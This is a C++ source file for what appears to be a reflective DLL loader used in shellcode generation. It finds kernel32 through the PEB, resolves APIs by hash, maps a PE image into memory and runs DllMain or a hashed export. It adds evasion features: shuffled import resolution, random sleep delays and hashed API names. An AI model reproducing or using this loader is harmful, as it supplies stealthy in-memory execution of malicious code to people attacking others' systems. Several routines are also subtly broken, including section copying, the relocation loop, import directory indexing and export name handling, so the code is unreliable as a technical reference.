#include "loader.hpp"
#include "../shared/crypto.hpp"

void Load(PBYTE pImage, DWORD dwFunctionHash, PVOID pvUserData, DWORD dwUserDataLen, DWORD dwFlags)
{
    /*
        1.) Locate the required functions and modules from exports with their hashed names
    */

    auto pbKernel32Dll = GetModuleAddressFromHash(KERNEL32_DLL_HASH);

    if (pbKernel32Dll == nullptr)
    {
        return;
    }

    std::random_device rd;
    std::mt19937 eng(rd());

    auto pLoadLibraryW = reinterpret_cast<LOAD_LIBRARY_W>(GetExportAddrFromHash(pbKernel32Dll, LOAD_LIBRARY_W_HASH, eng));
    auto pGetProcAddress = reinterpret_cast<GET_PROC_ADDRESS>(GetExportAddrFromHash(pbKernel32Dll, GET_PROC_ADDRESS_HASH, eng));
    auto pVirtualAlloc = reinterpret_cast<VIRTUAL_ALLOC>(GetExportAddrFromHash(pbKernel32Dll, VIRTUAL_ALLOC_HASH, eng));
    auto pFlushInstructionCache = reinterpret_cast<FLUSH_INSTRUCTION_CACHE>(GetExportAddrFromHash(pbKernel32Dll, FLUSH_INSTRUCTION_CACHE_HASH, eng));
    auto pVirtualProtect = reinterpret_cast<VIRTUAL_PROTECT>(GetExportAddrFromHash(pbKernel32Dll, VIRTUAL_PROTECT_HASH, eng));
    auto pSleep = reinterpret_cast<SLEEP>(GetExportAddrFromHash(pbKernel32Dll, SLEEP_HASH, eng));

    if (pLoadLibraryW == nullptr || pGetProcAddress == nullptr || pVirtualAlloc == nullptr || pFlushInstructionCache == nullptr || pVirtualProtect == nullptr || pSleep == nullptr)
    {
        return;
    }

    /*
        2.) Load the target image to a newly allocated permanent memory location with RW permissions
            - https://github.com/fancycode/MemoryModule/blob/master/MemoryModule.c
    */

    auto pNtHeaders = GetNtHeaders(pImage);

    if (pNtHeaders == nullptr)
    {
        return;
    }
    else if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        return;
    }
    else if (pNtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
    {
        return;
    }
    else if (pNtHeaders->OptionalHeader.SectionAlignment & 1)
    {
        return;
    }

    auto dwImageSize = pNtHeaders->OptionalHeader.SizeOfImage;
    auto ullPreferredImageBase = pNtHeaders->OptionalHeader.ImageBase;

    // Try to allocate the image to the preferred base address
    auto pNewImageBase = reinterpret_cast<ULONG_PTR>(pVirtualAlloc(reinterpret_cast<LPVOID>(ullPreferredImageBase), dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    if (!pNewImageBase)
    {
        // Try to allocate the image to any available base address
        pNewImageBase = reinterpret_cast<ULONG_PTR>(pVirtualAlloc(nullptr, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

        if (!pNewImageBase)
        {
            return;
        }
    }

    CopyHeadersAndSections(pNewImageBase, pImage, pNtHeaders);

    /*
        3.) Process the image relocations (assumes the image couldn't be loaded to the preferred base address)
    */

    auto ulpDelta = pNewImageBase - pNtHeaders->OptionalHeader.ImageBase;
    auto pDataDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (!ProcessRelocations(pNewImageBase, pDataDir, ulpDelta))
    {
        return;
    }

    /*
        4.) Resolve the imports by patching the Import Address Table (IAT)
    */

    if (!PatchImportAddressTable(pNewImageBase, pDataDir, pLoadLibraryW, pGetProcAddress, pSleep, eng))
    {
        return;
    }

    /*
        5.) Finalize the sections by setting protective permissions after mapping the image
    */

    FinalizeRelocations(pNewImageBase, pNtHeaders, pVirtualProtect, pFlushInstructionCache);

    /*
        6.) Execute DllMain or user defined function depending on the flag passed into the shellcode by the generator
    */

    if (dwFlags == 0)
    {
        // Execute DllMain with DLL_PROCESS_ATTACH
        auto pDllMain = reinterpret_cast<DLL_MAIN>(pNewImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
        // Optionally user data could also be passed to the DllMain instead of a separate function
        pDllMain(reinterpret_cast<HMODULE>(pNewImageBase), DLL_PROCESS_ATTACH, nullptr);
    }
    else
    {
        // Execute user defined function
        auto pbNewImageBase = reinterpret_cast<PBYTE>(pNewImageBase);
        auto pUserFunction = reinterpret_cast<USER_FUNCTION>(GetExportAddrFromHash(pbNewImageBase, dwFunctionHash, eng));
        pUserFunction(pvUserData, dwUserDataLen);
    }
}

void FinalizeRelocations(ULONG_PTR pNewImageBase, PIMAGE_NT_HEADERS64 pNtHeaders, VIRTUAL_PROTECT pVirtualProtect, FLUSH_INSTRUCTION_CACHE pFlushInstructionCache)
{
    auto pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    DWORD dwOldProtect, dwNewProtect;
    LPVOID lpAddress;

    for (auto i = 0; i < pNtHeaders->FileHeader.NumberOfSections; pSectionHeader++, i++)
    {
        dwNewProtect = 0;

        // Definitions for readability
        DWORD dwIsExecutable = (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        DWORD dwIsReadable = (pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ) != 0;
        DWORD dwIsWritable = (pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

        if (!dwIsExecutable && !dwIsReadable && !dwIsWritable)
        {
            dwNewProtect = PAGE_NOACCESS;
        }

        if (dwIsWritable)
        {
            dwNewProtect = PAGE_WRITECOPY;
        }

        if (dwIsReadable)
        {
            dwNewProtect = PAGE_READONLY;
        }

        if (dwIsWritable && dwIsReadable)
        {
            dwNewProtect = PAGE_READWRITE;
        }

        if (dwIsExecutable)
        {
            dwNewProtect = PAGE_EXECUTE;
        }

        if (dwIsExecutable && dwIsWritable)
        {
            dwNewProtect = PAGE_EXECUTE_WRITECOPY;
        }

        if (dwIsExecutable && dwIsReadable)
        {
            dwNewProtect = PAGE_EXECUTE_READ;
        }

        if (dwIsExecutable && dwIsWritable && dwIsReadable)
        {
            dwNewProtect = PAGE_EXECUTE_READWRITE;
        }

        lpAddress = reinterpret_cast<LPVOID>(pNewImageBase + pSectionHeader->VirtualAddress);
        pVirtualProtect(lpAddress, pSectionHeader->Misc.VirtualSize, dwNewProtect, &dwOldProtect);
    }

    pFlushInstructionCache(INVALID_HANDLE_VALUE, nullptr, 0);
}

BOOL PatchImportAddressTable(ULONG_PTR pNewImageBase, PIMAGE_DATA_DIRECTORY pDataDirectory, LOAD_LIBRARY_W pLoadLibraryW, GET_PROC_ADDRESS pGetProcAddress, SLEEP pSleep, std::mt19937 &eng)
{
    auto pImportDescriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(pNewImageBase + pDataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    if (pImportDescriptor == nullptr)
    {
        return FALSE;
    }

    /*
        1.) Shuffle Import Table entries
        2.) Delay the relocation of each import a semirandom duration
        3.) Conditional execution based on ordinal/name
        4.) Indirect function call via pointer
    */

    int importCount = 0;
    auto pId = pImportDescriptor;

    while (pId->Name)
    {
        importCount++;
        pId++;
    }

    std::vector<std::pair<int, DWORD>> sleepDurations;
    std::uniform_int_distribution<> sleepDist(1000, MAX_IMPORT_DELAY_MS);

    if (importCount > 1 && OBFUSCATE_IMPORTS)
    {
        for (auto i = 0; i < importCount - 1; i++)
        {
            std::uniform_int_distribution<> distr(i, importCount - 1);
            int j = distr(eng);

            // Swap
            auto tmp = pImportDescriptor[i];
            pImportDescriptor[i] = pImportDescriptor[j];
            pImportDescriptor[j] = tmp;

            // Store unique sleep durations with their corresponding import index
            auto sleepTime = sleepDist(eng);
            sleepDurations.push_back(std::make_pair(i, sleepTime));
        }
    }

    LPCWSTR pwszModuleName;
    HMODULE hModule;
    PIMAGE_THUNK_DATA64 pThunkData, pThunkDataIat;

    for (auto i = 0; pImportDescriptor->Name; pImportDescriptor++, i++)
    {
        // Apply delay
        if (OBFUSCATE_IMPORTS)
        {
            auto it = std::find_if(sleepDurations.begin(), sleepDurations.end(), [i](const std::pair<int, DWORD> &pair)
                                   { return pair.first == i; });

            if (it != sleepDurations.end())
            {
                pSleep(it->second);
            }
        }

        pwszModuleName = reinterpret_cast<LPCWSTR>(pNewImageBase + pImportDescriptor->Name);
        hModule = pLoadLibraryW(pwszModuleName);

        if (hModule == nullptr)
        {
            return FALSE;
        }

        pThunkData = reinterpret_cast<PIMAGE_THUNK_DATA64>(pNewImageBase + pImportDescriptor->OriginalFirstThunk);
        pThunkDataIat = reinterpret_cast<PIMAGE_THUNK_DATA64>(pNewImageBase + pImportDescriptor->FirstThunk);

        LPCSTR lpProcName;
        PIMAGE_IMPORT_BY_NAME pImportByName;

        for (auto j = 0; pThunkData->u1.Function; pThunkData++, pThunkDataIat++, j++)
        {
            if (pThunkData->u1.Ordinal & IMAGE_ORDINAL_FLAG64)
            {
                // High bits masked out to get the ordinal number
                lpProcName = reinterpret_cast<LPCSTR>(pThunkData->u1.Ordinal & 0xFFFF);
            }
            else
            {
                // The address of the imported function is stored in the IMAGE_IMPORT_BY_NAME structure
                pImportByName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(pNewImageBase + pThunkData->u1.AddressOfData);
                lpProcName = pImportByName->Name;
            }

            pThunkDataIat->u1.Function = reinterpret_cast<ULONGLONG>(pGetProcAddress(hModule, lpProcName));
        }
    }

    return TRUE;
}

BOOL ProcessRelocations(ULONG_PTR pNewImageBase, PIMAGE_DATA_DIRECTORY pDataDirectory, ULONG_PTR ulpDelta)
{
    auto pRelocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(pNewImageBase + pDataDirectory->VirtualAddress);

    if (pRelocation == nullptr || pDataDirectory->Size == 0)
    {
        return FALSE;
    }

    // Upper bound to prevent accessing memory part the end of the relocation data
    auto dwRelocationEnd = pDataDirectory->VirtualAddress + pDataDirectory->Size;
    PIMAGE_RELOC pRelocationList;

    while (pRelocation->VirtualAddress && pRelocation->VirtualAddress <= dwRelocationEnd && pRelocation->SizeOfBlock)
    {
        pRelocationList = reinterpret_cast<PIMAGE_RELOC>(pRelocation + 1);

        while (reinterpret_cast<PBYTE>(pRelocationList) < reinterpret_cast<PBYTE>(pRelocation) + pRelocation->SizeOfBlock)
        {
            auto pPatchAddress = reinterpret_cast<PBYTE>(pNewImageBase + pRelocation->VirtualAddress + pRelocationList->offset);

            // Note -- Types adjusted from PULONG_PTR to PDWORD and PWORD
            switch (pRelocationList->type)
            {
            case IMAGE_REL_BASED_DIR64:
                *reinterpret_cast<PULONG_PTR>(pPatchAddress) += ulpDelta;
                break;
            case IMAGE_REL_BASED_HIGHLOW:
                *reinterpret_cast<PDWORD>(pPatchAddress) += static_cast<DWORD>(ulpDelta);
                break;
            case IMAGE_REL_BASED_HIGH:
                *reinterpret_cast<PWORD>(pPatchAddress) += HIWORD(ulpDelta);
                break;
            case IMAGE_REL_BASED_LOW:
                *reinterpret_cast<PWORD>(pPatchAddress) += LOWORD(ulpDelta);
                break;
            default:
                continue;
            }

            pRelocationList++;
        }

        pRelocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(pRelocationList);
    }

    return TRUE;
}

void CopyHeadersAndSections(ULONG_PTR pNewImageBase, PBYTE pbImage, PIMAGE_NT_HEADERS64 pNtHeaders)
{
    // Copy headers
    auto pbDst = reinterpret_cast<PBYTE>(pNewImageBase);
    std::copy(pbImage, pbImage + pNtHeaders->OptionalHeader.SizeOfHeaders, pbDst);

    // Copy sections
    auto pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    pbDst = reinterpret_cast<PBYTE>(pNewImageBase + pSectionHeader->VirtualAddress);

    PBYTE pbSrc;

    for (auto i = 0; i < pNtHeaders->FileHeader.NumberOfSections; pSectionHeader++, i++)
    {
        pbSrc = reinterpret_cast<PBYTE>(pbImage + pSectionHeader->PointerToRawData);
        std::copy(pbSrc, pbSrc + pSectionHeader->SizeOfRawData, pbDst);
    }
}

PBYTE GetModuleAddressFromHash(DWORD dwHash)
{
    // https://en.wikipedia.org/wiki/Win32_Thread_Information_Block
#if defined(_WIN64)
    // PEB is at GS:[0x60]
    auto pPEB = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    // PEB is at FS:[0x30]
    auto pPEB = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif

    auto pLdr = reinterpret_cast<PMY_PEB_LDR_DATA>(pPEB->Ldr);
    auto pEntry = reinterpret_cast<PMY_LDR_DATA_TABLE_ENTRY>(pLdr->InLoadOrderModuleList.Flink);

    while (pEntry->DllBase != NULL)
    {
        if (CalculateHash(pEntry->BaseDllName) == dwHash && pEntry->DllBase != nullptr)
        {
            return reinterpret_cast<PBYTE>(pEntry->DllBase);
        }

        pEntry = reinterpret_cast<PMY_LDR_DATA_TABLE_ENTRY>(pEntry->InLoadOrderLinks.Flink);
    }

    return nullptr;
}

HMODULE GetExportAddrFromHash(PBYTE pbModule, DWORD dwHash, std::mt19937 &eng)
{
    auto pNtHeaders = GetNtHeaders(pbModule);

    if (pNtHeaders == nullptr)
    {
        return nullptr;
    }

    auto *pExportDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    auto *pExport = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(pbModule + pExportDir->VirtualAddress);

    /*
        1.) Read the export data (dwNameRva's)
        2.) Shuffle the order of the collected export name RVA's
        3.) Find the correct export by calculating hashes of the function names
    */

    DWORD dwNameRva;
    std::vector<std::tuple<DWORD, size_t>> vNameRvas;

    for (DWORD i = 0; i < pExport->NumberOfNames; i++)
    {
        dwNameRva = (reinterpret_cast<DWORD *>(pbModule + pExport->AddressOfNames))[i];
        vNameRvas.push_back(std::make_tuple(dwNameRva, i));
    }

    std::shuffle(vNameRvas.begin(), vNameRvas.end(), eng);

    DWORD dwNameHash, dwFunctionRva;
    UNICODE_STRING *strFunctionNameBase;
    WORD wOrdinal;

    for (auto dwNRva : vNameRvas)
    {
        strFunctionNameBase = reinterpret_cast<UNICODE_STRING *>(pbModule + std::get<0>(dwNRva));
        dwNameHash = CalculateHash(*strFunctionNameBase);

        if (dwNameHash == dwHash)
        {
            wOrdinal = (reinterpret_cast<WORD *>(pbModule + pExport->AddressOfNameOrdinals))[std::get<1>(dwNRva)];
            dwFunctionRva = (reinterpret_cast<DWORD *>(pbModule + pExport->AddressOfFunctions))[wOrdinal];

            return reinterpret_cast<HMODULE>(pbModule + dwFunctionRva);
        }
    }

    return nullptr;
}

PIMAGE_NT_HEADERS64 GetNtHeaders(PBYTE pbImage)
{
    auto pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(pbImage);

    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return nullptr;
    }

    auto pNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(pbImage + pDosHeader->e_lfanew);

    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        return nullptr;
    }

    return pNtHeaders;
}
